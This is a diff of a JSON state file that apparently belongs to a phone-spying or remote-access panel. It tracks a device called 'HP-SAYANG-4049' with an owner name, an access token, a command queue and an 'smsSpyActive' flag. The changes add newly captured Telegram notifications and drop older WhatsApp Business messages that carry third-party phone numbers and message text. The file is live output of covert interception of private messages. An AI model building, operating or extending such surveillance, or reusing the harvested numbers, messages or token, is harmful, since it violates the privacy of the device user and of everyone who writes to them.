@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775636757988,
+    "lastSeen": 1775636762265,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "TEAM ZANXRES: You",
+        "content": "T̴̕ ̐͒ T̴̕ ̐͒ joined to the group TEAM ZANXRES via invite link",
+        "time": "08/04 15:26",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636762867
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "13 new messages from 12 chats",
+        "time": "08/04 15:26",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636762680
+      },
+      {
+        "appName": "Telegram",
+        "sender": "TEAM ZANXRES: You",
+        "content": "T̴̕ ̐͒ T̴̕ ̐͒ joined to the group TEAM ZANXRES via invite link",
+        "time": "08/04 15:25",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775636758964
+      },
       {
         "appName": "Telegram",
         "sender": "𝗥𝗢𝗖𝗞𝗬 𝗧𝗘𝗔𝗠 🚩",
@@ -4302,30 +4326,6 @@
         "time": "08/04 14:29",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775633352938
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 838-1173-3694",
-        "content": "Oi",
-        "time": "08/04 14:29",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633352933
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎202 pesan dari 3 chat",
-        "time": "08/04 14:29",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633351157
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 856-2460-4911",
-        "content": "Permisi Azx",
-        "time": "08/04 14:29",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633351069
       }
     ],
     "galleryPhotos": [],
